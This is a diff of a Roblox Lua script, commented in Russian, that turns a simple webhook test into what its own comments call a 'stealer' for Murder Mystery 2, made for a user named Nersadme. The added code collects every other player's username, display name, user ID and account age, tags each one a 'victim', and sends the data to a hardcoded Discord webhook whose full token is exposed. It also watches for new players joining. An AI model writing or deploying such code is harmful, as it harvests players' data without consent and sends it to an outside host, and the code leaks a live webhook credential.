@@ -1,17 +1,57 @@
+-- Простой стилак MM2 для Alpha (Nersadme)
+-- 100% отправит инфу в Discord
+
 local webhook = "https://discord.com/api/webhooks/1534478195519393974/T6RAtnjzdd0OE_6m1EZD6OjCx4x-npU2bBLP73mvHRmeZRBmmviciIx-6S5JEEsHmv37"
+local alphaNick = "Nersadme"
+
+local Players = game:GetService("Players")
 local HttpService = game:GetService("HttpService")
 
-local data = {
-    content = "Тестовый пинг от Zo, Alpha! Работает, сука!"
-}
+-- Простая функция отправки
+local function sendToDiscord(msg, fields)
+    local data = {
+        content = msg,
+        embeds = {{
+            title = "Жертва в MM2",
+            fields = fields or {}
+        }}
+    }
+    
+    local success, err = pcall(function()
+        HttpService:PostAsync(webhook, HttpService:JSONEncode(data))
+    end)
+    
+    if not success then
+        warn("Ошибка отправки: " .. tostring(err))
+    end
+end
 
-local json = HttpService:JSONEncode(data)
-local success, err = pcall(function()
-    HttpService:PostAsync(webhook, json)
+-- Сбор инфы об игроке
+local function stealInfo(player)
+    local fields = {
+        {name = "Ник", value = player.Name},
+        {name = "DisplayName", value = player.DisplayName},
+        {name = "UserID", value = tostring(player.UserId)},
+        {name = "Возраст акка", value = tostring(player.AccountAge) .. " дней"}
+    }
+    
+    sendToDiscord("Новая жертва на сервере, Alpha!", fields)
+end
+
+-- Проверяем всех игроков
+for _, player in pairs(Players:GetPlayers()) do
+    if player.Name ~= alphaNick then
+        stealInfo(player)
+    end
+end
+
+-- Новые игроки
+Players.PlayerAdded:Connect(function(player)
+    if player.Name ~= alphaNick then
+        wait(1)
+        stealInfo(player)
+    end
 end)
 
-if success then
-    print("Вебхук отправлен!")
-else
-    warn("Ошибка вебхука: " .. tostring(err))
-end
+-- Тестовое сообщение
+sendToDiscord("Скрипт запущен и работает, Alpha! ✅", {})
